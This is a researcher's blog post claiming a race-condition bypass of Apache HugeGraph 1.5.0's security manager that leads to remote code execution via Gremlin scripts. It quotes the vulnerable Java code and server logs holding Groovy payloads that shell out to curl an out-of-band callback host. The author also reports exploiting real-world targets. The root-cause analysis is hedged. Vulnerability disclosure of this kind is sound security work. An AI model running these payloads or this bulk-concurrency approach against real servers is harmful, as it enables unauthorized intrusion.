---
title: "Bypass 2 RCE: Apache HugeGraph Server"
classes: wide
header:
  teaser: /assets/images/hugegraph.png
ribbon: red
description: "Research for bypassing SecurityManager for a RCE Vunerability in Apache HugeGraph Server."
categories:
  - Exploit Development
tags:
  - Exploit Development
  - Apache
  - PoC
  - Exploitation
  - zero day
  - 0day
  - cve
toc: true
---
# Introduction

During my ongoing security research into Apache products, specifically focusing on Remote Code Execution (RCE) vulnerabilities, I discovered a fascinating and critical flaw in Apache HugeGraph Server's latest version(1.5.0). This vulnerability represents a unique case where the same malicious payload that gets consistently blocked during individual testing can successfully execute when sent as part of bulk concurrent requests.

# Background: Previous Work

My journey with HugeGraph began with analyzing [CVE-2024-27348](https://github.com/Zeyad-Azima/CVE-2024-27348), a vulnerability I previously worked-on that allowed bypassing sandbox restrictions to achieve RCE through Gremlin. You can read my detailed analysis [here](https://blog.securelayer7.net/remote-code-execution-in-apache-hugegraph/) for more understanding of the `SecurityManager` and How it executes scripts.

After that discovery, I became determined to find ways to bypass the subsequent security mitigations implemented by the Apache team. My initial manual testing with various payloads yielded nothing promising—every attack vector seemed to be properly blocked by the enhanced SecurityManager.

# The Unexpected Discovery

Frustrated by the apparent effectiveness of the new security controls, I decided to automate my testing approach. I asked an LLM to generate a comprehensive testing script that would include multiple different payloads and test them systematically. The generated script included over 50 different attack payloads across 3 different testing approaches. When I executed this bulk testing script, something unexpected happened: **some payloads were getting accepted and executing successfully**. Initially, I assumed this was normal behavior—perhaps some payloads had found new bypass techniques. However, when I extracted these "successful" payloads to test them individually for debugging purposes, the SecurityManager blocked every single one. Confused, I ran the bulk script again. This time, **different payloads that had been blocked before were now succeeding**. This inconsistent behavior was the key that unlocked a much deeper vulnerability.

# The Analysis

After extensive analysis, I discovered that the root cause might be a **Time-of-Check Time-of-Use (TOCTOU) race condition** in the `HugeSecurityManager` class. The vulnerability exists in how the SecurityManager determines whether a dangerous operation (like `Runtime.exec()`) is being called from within Gremlin/Groovy execution context.

Here's the vulnerable code in `hugegraph-core/src/main/java/org/apache/hugegraph/security/HugeSecurityManager.java`:

```java
private static boolean callFromWorkerWithClass(Set<String> classes) {
    Thread curThread = Thread.currentThread();
    if (curThread.getName().startsWith(GREMLIN_SERVER_WORKER) ||
        curThread.getName().startsWith(TASK_WORKER)) {

        // RACE CONDITION
        StackTraceElement[] elements = curThread.getStackTrace();  // ← NON-ATOMIC
        for (StackTraceElement element : elements) {
            String className = element.getClassName();
            if (classes.contains(className)) {  // ← Looking for GremlinGroovyScriptEngine
                return true;
            }
        }
    }
    return false;
}
```


The vulnerability exists in the timing window between `Thread.currentThread().getStackTrace()`, which captures a snapshot of the current stack, and the subsequent iteration loop that checks each stack frame for Gremlin classes. During concurrent request processing, this window allows for stack frame corruption from other simultaneous operations, missing Gremlin classes due to asynchronous cleanup, stale stack traces that fail to reflect the current execution context, and thread pool pollution from other requests.

So, Basically it might be as the following:
```
Thread: gremlin-server-exec-5 (correct thread name ✓)
StackTraceElement[] elements = curThread.getStackTrace();

RACE CONDITION: Between getStackTrace() and the iteration loop,
the stack can be modified by:
- Other concurrent Gremlin requests
- Asynchronous operations
- Thread pool management
- JVM stack frame cleanup

for (StackTraceElement element : elements) {
    // elements[] now contains STALE/CORRUPTED stack trace
    // Missing GremlinGroovyScriptEngine due to timing
    String className = element.getClassName();
    if (classes.contains(className)) {  // Returns FALSE (incorrect!)
        return true;
    }
}
return false;  // ← INCORRECTLY returns false → RCE ALLOWED! ❌
```

## Non-Atomic
Another  issue with this vulnerability lies in the reliance on non-atomic operations for security checks, rendering them unreliable under concurrent load. The problematic code is as follows:

```Java
@Override
public void checkExec(String cmd) {
    if (callFromGremlin()) {  // ← This check can fail inconsistently
        throw newSecurityException("Not allowed to execute command via Gremlin");
    }
    super.checkExec(cmd);  // ← Command executes if check returns false
}
```

In high-concurrency scenarios, rapid thread context switching causes stack frames to become polluted by parallel operations, while background tasks disrupt stack trace consistency. The absence of synchronization mechanisms leaves the critical security check unprotected, allowing the vulnerability to manifest unpredictably and making it exploitable under production load conditions.

> Note: When I take a look at the server logs it was some exceptions and some payloads gets error on the logging but it pass and gets executed, Others show "?" mark with-in the logs.

```
2025-09-17 22:37:02 [gremlin-server-exec-9] [ERROR] o.a.t.g.g.j.GremlinGroovyScriptEngine - Script compilation FAILED try { def proc = java.lang.Runtime.getRuntime().exec('curl -s http://[sub].oast.fun/closeable-1758148622'); proc.waitFor(); } catch(Exception e) { e.printStackTrace(); } 'executed' took 6ms org.codehaus.groovy.control.MultipleCompilationErrorsException: startup failed:
Script10.groovy: 1: unexpected token: executed @ line 1, column 199.
   n e) { e.printStackTrace(); } 'executed'
                                 ^

1 error

2025-09-17 22:37:02 [gremlin-server-exec-9] [WARN] o.a.t.g.s.h.HttpHandlerUtil - Invalid request - responding with 500 Internal Server Error and startup failed:
Script10.groovy: 1: unexpected token: executed @ line 1, column 199.
   n e) { e.printStackTrace(); } 'executed'
                                 ^

1 error

org.codehaus.groovy.control.MultipleCompilationErrorsException: startup failed:
Script10.groovy: 1: unexpected token: executed @ line 1, column 199.
   n e) { e.printStackTrace(); } 'executed'
                                 ^

1 error

	at org.codehaus.groovy.control.ErrorCollector.failIfErrors(ErrorCollector.java:311) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.control.ErrorCollector.addFatalError(ErrorCollector.java:151) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.control.ErrorCollector.addError(ErrorCollector.java:121) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.control.ErrorCollector.addError(ErrorCollector.java:133) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.control.SourceUnit.addError(SourceUnit.java:325) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.antlr.AntlrParserPlugin.transformCSTIntoAST(AntlrParserPlugin.java:224) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.antlr.AntlrParserPlugin.parseCST(AntlrParserPlugin.java:192) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.control.SourceUnit.parse(SourceUnit.java:226) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.control.CompilationUnit$1.call(CompilationUnit.java:201) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.control.CompilationUnit.applyToSourceUnits(CompilationUnit.java:965) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.control.CompilationUnit.doPhaseOperation(CompilationUnit.java:642) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.control.CompilationUnit.processPhaseOperations(CompilationUnit.java:618) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.control.CompilationUnit.compile(CompilationUnit.java:595) ~[groovy-2.5.14-indy.jar:2.5.14]
	at groovy.lang.GroovyClassLoader.doParseClass(GroovyClassLoader.java:401) ~[groovy-2.5.14-indy.jar:2.5.14]
	at groovy.lang.GroovyClassLoader.access$300(GroovyClassLoader.java:89) ~[groovy-2.5.14-indy.jar:2.5.14]
	at groovy.lang.GroovyClassLoader$5.provide(GroovyClassLoader.java:341) ~[groovy-2.5.14-indy.jar:2.5.14]
	at groovy.lang.GroovyClassLoader$5.provide(GroovyClassLoader.java:338) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.runtime.memoize.ConcurrentCommonCache.getAndPut(ConcurrentCommonCache.java:147) ~[groovy-2.5.14-indy.jar:2.5.14]
	at groovy.lang.GroovyClassLoader.parseClass(GroovyClassLoader.java:336) ~[groovy-2.5.14-indy.jar:2.5.14]
	at groovy.lang.GroovyClassLoader.parseClass(GroovyClassLoader.java:320) ~[groovy-2.5.14-indy.jar:2.5.14]
	at groovy.lang.GroovyClassLoader.parseClass(GroovyClassLoader.java:262) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.apache.tinkerpop.gremlin.groovy.jsr223.GremlinGroovyScriptEngine$GroovyCacheLoader.lambda$load$0(GremlinGroovyScriptEngine.java:821) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at java.util.concurrent.CompletableFuture$AsyncSupply.run(CompletableFuture.java:1700) ~[?:?]
	at java.util.concurrent.CompletableFuture.asyncSupplyStage(CompletableFuture.java:1714) ~[?:?]
	at java.util.concurrent.CompletableFuture.supplyAsync(CompletableFuture.java:1931) ~[?:?]
	at org.apache.tinkerpop.gremlin.groovy.jsr223.GremlinGroovyScriptEngine$GroovyCacheLoader.load(GremlinGroovyScriptEngine.java:819) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at org.apache.tinkerpop.gremlin.groovy.jsr223.GremlinGroovyScriptEngine$GroovyCacheLoader.load(GremlinGroovyScriptEngine.java:814) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at com.github.benmanes.caffeine.cache.BoundedLocalCache$BoundedLocalLoadingCache.lambda$new$0(BoundedLocalCache.java:3117) ~[caffeine-2.3.1.jar:?]
	at com.github.benmanes.caffeine.cache.LocalCache.lambda$statsAware$0(LocalCache.java:144) ~[caffeine-2.3.1.jar:?]
	at com.github.benmanes.caffeine.cache.BoundedLocalCache.lambda$doComputeIfAbsent$16(BoundedLocalCache.java:1968) ~[caffeine-2.3.1.jar:?]
	at java.util.concurrent.ConcurrentHashMap.compute(ConcurrentHashMap.java:1908) ~[?:?]
	at com.github.benmanes.caffeine.cache.BoundedLocalCache.doComputeIfAbsent(BoundedLocalCache.java:1966) ~[caffeine-2.3.1.jar:?]
	at com.github.benmanes.caffeine.cache.BoundedLocalCache.computeIfAbsent(BoundedLocalCache.java:1949) ~[caffeine-2.3.1.jar:?]
	at com.github.benmanes.caffeine.cache.LocalCache.computeIfAbsent(LocalCache.java:113) ~[caffeine-2.3.1.jar:?]
	at com.github.benmanes.caffeine.cache.LocalLoadingCache.get(LocalLoadingCache.java:67) ~[caffeine-2.3.1.jar:?]
	at org.apache.tinkerpop.gremlin.groovy.jsr223.GremlinGroovyScriptEngine.getScriptClass(GremlinGroovyScriptEngine.java:569) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at org.apache.tinkerpop.gremlin.groovy.jsr223.GremlinGroovyScriptEngine.eval(GremlinGroovyScriptEngine.java:376) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at javax.script.AbstractScriptEngine.eval(AbstractScriptEngine.java:233) ~[java.scripting:?]
	at org.apache.tinkerpop.gremlin.groovy.engine.GremlinExecutor.lambda$eval$0(GremlinExecutor.java:272) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at java.util.concurrent.FutureTask.run(FutureTask.java:264) [?:?]
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515) [?:?]
	at java.util.concurrent.FutureTask.run(FutureTask.java:264) [?:?]
	at org.apache.hugegraph.auth.HugeGraphAuthProxy$ContextTask.run(HugeGraphAuthProxy.java:1915) [hugegraph-api-1.5.0.jar:0.71.0.0]
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) [?:?]
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) [?:?]
	at java.lang.Thread.run(Thread.java:829) [?:?]
2025-09-17 22:37:02 [gremlin-server-exec-10] [WARN] o.a.t.g.s.h.HttpHandlerUtil - Invalid request - responding with 500 Internal Server Error and No such property: graph for class: Script11
groovy.lang.MissingPropertyException: No such property: graph for class: Script11
	at org.codehaus.groovy.runtime.ScriptBytecodeAdapter.unwrap(ScriptBytecodeAdapter.java:65) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.runtime.callsite.PogoGetPropertySite.getProperty(PogoGetPropertySite.java:51) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callGroovyObjectGetProperty(AbstractCallSite.java:309) ~[groovy-2.5.14-indy.jar:2.5.14]
	at Script11.run(Script11.groovy:1) ~[?:?]
	at org.apache.tinkerpop.gremlin.groovy.jsr223.GremlinGroovyScriptEngine.eval(GremlinGroovyScriptEngine.java:676) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at org.apache.tinkerpop.gremlin.groovy.jsr223.GremlinGroovyScriptEngine.eval(GremlinGroovyScriptEngine.java:378) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at javax.script.AbstractScriptEngine.eval(AbstractScriptEngine.java:233) ~[java.scripting:?]
	at org.apache.tinkerpop.gremlin.groovy.engine.GremlinExecutor.lambda$eval$0(GremlinExecutor.java:272) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at java.util.concurrent.FutureTask.run(FutureTask.java:264) [?:?]
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515) [?:?]
	at java.util.concurrent.FutureTask.run(FutureTask.java:264) [?:?]
	at org.apache.hugegraph.auth.HugeGraphAuthProxy$ContextTask.run(HugeGraphAuthProxy.java:1915) [hugegraph-api-1.5.0.jar:0.71.0.0]
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) [?:?]
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) [?:?]
	at java.lang.Thread.run(Thread.java:829) [?:?]
2025-09-17 22:37:02 [gremlin-server-exec-11] [WARN] o.a.h.s.HugeSecurityManager - SecurityException: Not allowed to execute command via Gremlin
2025-09-17 22:37:02 [gremlin-server-exec-11] [WARN] o.a.t.g.s.h.HttpHandlerUtil - Invalid request - responding with 500 Internal Server Error and Not allowed to execute command via Gremlin
java.lang.SecurityException: Not allowed to execute command via Gremlin
	at org.apache.hugegraph.security.HugeSecurityManager.newSecurityException(HugeSecurityManager.java:380) ~[hugegraph-core-1.5.0.jar:1.5.0]
	at org.apache.hugegraph.security.HugeSecurityManager.checkExec(HugeSecurityManager.java:205) ~[hugegraph-core-1.5.0.jar:1.5.0]
	at java.lang.ProcessBuilder.start(ProcessBuilder.java:1096) ~[?:?]
	at java.lang.ProcessBuilder.start(ProcessBuilder.java:1071) ~[?:?]
	at java.lang.Runtime.exec(Runtime.java:592) ~[?:?]
	at java.lang.Runtime.exec(Runtime.java:416) ~[?:?]
	at java.lang.Runtime.exec(Runtime.java:313) ~[?:?]
	at java_lang_Runtime$exec$0.call(Unknown Source) ~[?:?]
	at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:47) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:115) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:127) ~[groovy-2.5.14-indy.jar:2.5.14]
	at Script12.run(Script12.groovy:1) ~[?:?]
	at org.apache.tinkerpop.gremlin.groovy.jsr223.GremlinGroovyScriptEngine.eval(GremlinGroovyScriptEngine.java:676) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at org.apache.tinkerpop.gremlin.groovy.jsr223.GremlinGroovyScriptEngine.eval(GremlinGroovyScriptEngine.java:378) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at javax.script.AbstractScriptEngine.eval(AbstractScriptEngine.java:233) ~[java.scripting:?]
	at org.apache.tinkerpop.gremlin.groovy.engine.GremlinExecutor.lambda$eval$0(GremlinExecutor.java:272) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at java.util.concurrent.FutureTask.run(FutureTask.java:264) [?:?]
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515) [?:?]
	at java.util.concurrent.FutureTask.run(FutureTask.java:264) [?:?]
	at org.apache.hugegraph.auth.HugeGraphAuthProxy$ContextTask.run(HugeGraphAuthProxy.java:1915) [hugegraph-api-1.5.0.jar:0.71.0.0]
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) [?:?]
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) [?:?]
	at java.lang.Thread.run(Thread.java:829) [?:?]
2025-09-17 22:37:02 [gremlin-server-exec-12] [WARN] o.a.h.s.HugeSecurityManager - SecurityException: Not allowed to execute command via Gremlin
2025-09-17 22:37:02 [gremlin-server-exec-12] [WARN] o.a.t.g.s.h.HttpHandlerUtil - Invalid request - responding with 500 Internal Server Error and Not allowed to execute command via Gremlin
java.lang.SecurityException: Not allowed to execute command via Gremlin
	at org.apache.hugegraph.security.HugeSecurityManager.newSecurityException(HugeSecurityManager.java:380) ~[hugegraph-core-1.5.0.jar:1.5.0]
	at org.apache.hugegraph.security.HugeSecurityManager.checkExec(HugeSecurityManager.java:205) ~[hugegraph-core-1.5.0.jar:1.5.0]
	at java.lang.ProcessBuilder.start(ProcessBuilder.java:1096) ~[?:?]
	at java.lang.ProcessBuilder.start(ProcessBuilder.java:1071) ~[?:?]
	at java.lang.Runtime.exec(Runtime.java:592) ~[?:?]
	at java.lang.Runtime.exec(Runtime.java:451) ~[?:?]
	at java_lang_Runtime$exec$1.call(Unknown Source) ~[?:?]
	at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:47) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:115) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:127) ~[groovy-2.5.14-indy.jar:2.5.14]
	at Script13.run(Script13.groovy:1) ~[?:?]
	at org.apache.tinkerpop.gremlin.groovy.jsr223.GremlinGroovyScriptEngine.eval(GremlinGroovyScriptEngine.java:676) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at org.apache.tinkerpop.gremlin.groovy.jsr223.GremlinGroovyScriptEngine.eval(GremlinGroovyScriptEngine.java:378) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at javax.script.AbstractScriptEngine.eval(AbstractScriptEngine.java:233) ~[java.scripting:?]
	at org.apache.tinkerpop.gremlin.groovy.engine.GremlinExecutor.lambda$eval$0(GremlinExecutor.java:272) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at java.util.concurrent.FutureTask.run(FutureTask.java:264) [?:?]
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515) [?:?]
	at java.util.concurrent.FutureTask.run(FutureTask.java:264) [?:?]
	at org.apache.hugegraph.auth.HugeGraphAuthProxy$ContextTask.run(HugeGraphAuthProxy.java:1915) [hugegraph-api-1.5.0.jar:0.71.0.0]
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) [?:?]
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) [?:?]
	at java.lang.Thread.run(Thread.java:829) [?:?]
2025-09-17 22:37:02 [gremlin-server-exec-1] [WARN] o.a.h.s.HugeSecurityManager - SecurityException: Not allowed to execute command via Gremlin
2025-09-17 22:37:02 [gremlin-server-exec-1] [WARN] o.a.t.g.s.h.HttpHandlerUtil - Invalid request - responding with 500 Internal Server Error and Not allowed to execute command via Gremlin
java.lang.SecurityException: Not allowed to execute command via Gremlin
	at org.apache.hugegraph.security.HugeSecurityManager.newSecurityException(HugeSecurityManager.java:380) ~[hugegraph-core-1.5.0.jar:1.5.0]
	at org.apache.hugegraph.security.HugeSecurityManager.checkExec(HugeSecurityManager.java:205) ~[hugegraph-core-1.5.0.jar:1.5.0]
	at java.lang.ProcessBuilder.start(ProcessBuilder.java:1096) ~[?:?]
	at java.lang.ProcessBuilder.start(ProcessBuilder.java:1071) ~[?:?]
	at java.lang.Runtime.exec(Runtime.java:592) ~[?:?]
	at java.lang.Runtime.exec(Runtime.java:416) ~[?:?]
	at java.lang.Runtime.exec(Runtime.java:313) ~[?:?]
	at java_lang_Runtime$exec$0.call(Unknown Source) ~[?:?]
	at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:47) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:115) ~[groovy-2.5.14-indy.jar:2.5.14]
	at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:127) ~[groovy-2.5.14-indy.jar:2.5.14]
	at Script14.run(Script14.groovy:1) ~[?:?]
	at org.apache.tinkerpop.gremlin.groovy.jsr223.GremlinGroovyScriptEngine.eval(GremlinGroovyScriptEngine.java:676) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at org.apache.tinkerpop.gremlin.groovy.jsr223.GremlinGroovyScriptEngine.eval(GremlinGroovyScriptEngine.java:378) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at javax.script.AbstractScriptEngine.eval(AbstractScriptEngine.java:233) ~[java.scripting:?]
	at org.apache.tinkerpop.gremlin.groovy.engine.GremlinExecutor.lambda$eval$0(GremlinExecutor.java:272) ~[gremlin-groovy-3.5.1.jar:3.5.1]
	at java.util.concurrent.FutureTask.run(FutureTask.java:264) [?:?]
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515) [?:?]
	at java.util.concurrent.FutureTask.run(FutureTask.java:264) [?:?]
	at org.apache.hugegraph.auth.HugeGraphAuthProxy$ContextTask.run(HugeGraphAuthProxy.java:1915) [hugegraph-api-1.5.0.jar:0.71.0.0]
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) [?:?]
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) [?:?]
	at java.lang.Thread.run(Thread.java:829) [?:?]
2025-09-17 22:37:02 [gremlin-server-exec-2] [ERROR] o.a.t.g.g.j.GremlinGroovyScriptEngine - Script compilation FAILED def file = new java.io.File('/bin/sh'); if(file.exists()) { java.lang.Runtime.getRuntime().exec('/bin/sh -c "curl -s http://.oast.fun/filesystem-1758148622"'); } 'executed' took 3ms org.codehaus.groovy.control.MultipleCompilationErrorsException: startup failed:
Script15.groovy: 1: unexpected token: executed @ line 1, column 196.
   n/filesystem-1758148622"'); } 'executed'
                                 ^
```

# Exploitation

The failed payload in execution will always return for you an exception `java.lang.SecurityException`, he successful ones will alays return binary in response.  I tested it on different real world targets and it worked.

![Screenshot 2025-09-19 at 12.02.28 AM.png](https://i.ibb.co/C5Wxs74j/Screenshot-2025-09-19-at-12-02-28-AM.png)

```json
{"service":"hugegraph","version":"1.5.0",
	"doc":"https://hugegraph.apache.org/docs/",
	"api_doc":"https://hugegraph.apache.org/docs/clients/","swagger_ui":"http://0.0.0.0:8089/swagger-ui/index.html",
	"apis":["arthas","auth","cypher","filter","graph","gremlin","job","metrics","profile","raft","resources","schema","traversers","variables"]}
```

And it worked on a latest version on that arget and was able to get information out of it by executing commands on it:

![screenshot](https://i.ibb.co/j9KFZpHD/Screenshot-2025-09-19-at-12-05-12-AM.png)

You can find the PoC on my [github](https://github.com/Zeyad-Azima/0DayHugeGraph).

# Debugging Challenges

One particularly insidious aspect of this vulnerability is the significant challenge it poses to traditional debugging methods, making it difficult to detect and reproduce. When attempting to debug the race condition, several obstacles arise: breakpoints in a debugger alter the timing, preventing the race condition from manifesting; single-step execution during manual testing consistently shows the security measures functioning correctly; additional logging introduces delays that can mask the issue by altering timing; and the vulnerability only emerges under specific concurrent load conditions. As a result, this vulnerability may go unnoticed during standard security testing, only becoming exploitable under the high-pressure environment of production load.

# Conclusion

This investigation into Apache HugeGraph Server reveals a critical vulnerability that enables bypassing the Security and acieve Remote Code Execution (RCE) under high-concurrency conditions, exposing a significant flaw in the `HugeSecurityManager` class. The inconsistent behavior of payloads—failing individually but succeeding during bulk concurrent requests—points to a race condition, likely stemming from non-atomic operations in the security check process. This issue, which manifests only under specific load scenarios, evades traditional debugging and testing methods, making it particularly insidious.
